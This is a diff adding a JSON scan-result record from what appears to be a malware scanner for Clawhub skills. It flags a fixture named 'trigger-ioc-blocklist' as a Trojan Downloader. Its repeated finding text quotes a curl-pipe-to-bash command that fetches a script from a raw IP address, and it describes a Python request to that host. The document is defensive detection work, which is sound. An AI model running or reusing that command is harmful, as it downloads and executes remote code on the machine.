@@ -1,0 +1,229 @@
+{
+  "preprocess": {
+    "skill": {
+      "root": "C:\\Files\\Study\\Codes\\Skill-Scan\\malicious-skill-library\\fixtures__trigger-ioc-blocklist",
+      "claims": [
+        "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack."
+      ],
+      "observed_kinds": [
+        "spreadsheet",
+        "imported_scan_result"
+      ]
+    },
+    "artifacts": [],
+    "rule_hits": [],
+    "coverage_gaps": [],
+    "stats": {
+      "artifact_count": 0,
+      "rule_hit_count": 1,
+      "severity_counts": {},
+      "rule_code_counts": {}
+    }
+  },
+  "triage": {
+    "skill": {
+      "claims": [
+        "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack."
+      ],
+      "obs": [
+        "Script Scan"
+      ],
+      "high_risk_features": [
+        "external_server",
+        "shell_or_command_execution"
+      ]
+    },
+    "arts": [],
+    "xconcerns": [],
+    "retrieve": [],
+    "coverage": {
+      "total": 1,
+      "indexed": 1,
+      "gaps": []
+    }
+  },
+  "security": {
+    "findings": [
+      {
+        "id": "",
+        "cat": "trojan-downloader",
+        "class": "active-malice",
+        "severity": "",
+        "conf": "",
+        "summary": "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+        "arts": [],
+        "spans": [],
+        "impact": "",
+        "fix": "",
+        "decision_level": "MALICIOUS",
+        "primary_group": "Active Malice",
+        "scan_level": "Script Scan",
+        "risk_types": [
+          "Trojan Downloader"
+        ],
+        "source_platform": "Clawhub",
+        "source_file": "scan_results_script_clawhub.csv",
+        "related_file_count": "1",
+        "flags": {
+          "external_server": true,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": false,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": false,
+          "obfuscation_or_evasion": false,
+          "persistence_or_external_storage": false
+        }
+      }
+    ],
+    "ctx_requests": [],
+    "coverage": {
+      "reviewed_arts": [],
+      "unresolved_high_risk_arts": []
+    }
+  },
+  "judge": {
+    "verdict": {
+      "label": "malicious",
+      "primary_concern": "trojan-downloader",
+      "issue_types": [
+        "trojan-downloader",
+        "active-malice"
+      ]
+    },
+    "top_findings": [
+      {
+        "id": "",
+        "cat": "trojan-downloader",
+        "class": "active-malice",
+        "severity": "",
+        "conf": "",
+        "summary": "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+        "impact": "",
+        "fix": "",
+        "decision_level": "MALICIOUS",
+        "primary_group": "Active Malice",
+        "scan_level": "Script Scan",
+        "risk_types": [
+          "Trojan Downloader"
+        ],
+        "source_platform": "Clawhub",
+        "source_file": "scan_results_script_clawhub.csv",
+        "related_file_count": "1",
+        "flags": {
+          "external_server": true,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": false,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": false,
+          "obfuscation_or_evasion": false,
+          "persistence_or_external_storage": false
+        },
+        "spans": []
+      }
+    ],
+    "coverage_audit": {
+      "adequate": true,
+      "missed": [],
+      "needs_rescan": false
+    },
+    "next_action": "stop"
+  },
+  "excel_import": {
+    "record_count": 1,
+    "headers": [
+      "一级分类_判定级别",
+      "二级分类_主问题组",
+      "风险类型汇总",
+      "风险类型1",
+      "风险类型2",
+      "风险类型3",
+      "风险类型4",
+      "来源平台",
+      "扫描层级",
+      "原始业务分类",
+      "skill_name",
+      "关联文件数",
+      "原始来源文件",
+      "问题摘要",
+      "原始verdict",
+      "flag_外部服务器",
+      "flag_APIKey",
+      "flag_自治执行",
+      "flag_浏览器会话/凭据",
+      "flag_文件系统访问",
+      "flag_Shell/命令执行",
+      "flag_驱动/安装器",
+      "flag_凭据请求",
+      "flag_混淆/规避",
+      "flag_持久化/外部存储",
+      "清洗后原始说明"
+    ],
+    "records": [
+      {
+        "classification": {
+          "decision_level": "MALICIOUS",
+          "primary_group": "Active Malice",
+          "risk_summary": "Trojan Downloader",
+          "risk_types": [
+            "Trojan Downloader"
+          ],
+          "platform": "Clawhub",
+          "scan_level": "Script Scan",
+          "business_category": "fixtures",
+          "skill_name": "trigger-ioc-blocklist",
+          "related_file_count": "1",
+          "source_file": "scan_results_script_clawhub.csv",
+          "problem_summary": "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+          "raw_verdict": "MALICIOUS: Trojan Downloader - Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+          "cleaned_description": "",
+          "flags": {
+            "external_server": true,
+            "api_key": false,
+            "autonomous_execution": false,
+            "browser_session_or_credentials": false,
+            "filesystem_access": false,
+            "shell_or_command_execution": true,
+            "driver_or_installer": false,
+            "credential_request": false,
+            "obfuscation_or_evasion": false,
+            "persistence_or_external_storage": false
+          }
+        },
+        "raw_values": {
+          "一级分类_判定级别": "MALICIOUS",
+          "二级分类_主问题组": "Active Malice",
+          "风险类型汇总": "Trojan Downloader",
+          "风险类型1": "Trojan Downloader",
+          "风险类型2": "",
+          "风险类型3": "",
+          "风险类型4": "",
+          "来源平台": "Clawhub",
+          "扫描层级": "Script Scan",
+          "原始业务分类": "fixtures",
+          "skill_name": "trigger-ioc-blocklist",
+          "关联文件数": 1,
+          "原始来源文件": "scan_results_script_clawhub.csv",
+          "问题摘要": "Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+          "原始verdict": "MALICIOUS: Trojan Downloader - Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.",
+          "flag_外部服务器": "Y",
+          "flag_APIKey": "",
+          "flag_自治执行": "",
+          "flag_浏览器会话/凭据": "",
+          "flag_文件系统访问": "",
+          "flag_Shell/命令执行": "Y",
+          "flag_驱动/安装器": "",
+          "flag_凭据请求": "",
+          "flag_混淆/规避": "",
+          "flag_持久化/外部存储": "",
+          "清洗后原始说明": "MALICIOUS: Trojan Downloader - Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack."
+        }
+      }
+    ]
+  }
+}
